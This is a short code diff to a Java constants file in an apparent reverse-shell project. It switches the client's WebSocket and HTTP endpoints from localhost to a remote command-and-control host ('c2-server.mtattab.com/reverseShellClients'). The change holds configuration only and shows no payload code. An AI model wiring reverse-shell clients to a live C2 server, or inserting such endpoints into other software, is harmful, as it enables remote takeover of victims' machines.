@@ -2,11 +2,11 @@ package com.mtattab.reverseshell.util;
 
 public interface Constants {
 
-    public static final String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
-    public static final String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;
+//    public static final String SERVER_WEBSOCKET_URI = "ws://127.0.0.1:8070/reverseShellClients" ;
+//    public static final String SERVER_HTTP_URI = "http://127.0.0.1:8070" ;
 
-//    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
-//    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;
+    public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ;
+    public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ;
 
 //    public static final String PROD_SERVER_WEBSOCKET_URI = "wss://<?>/reverseShellClients" ;
 
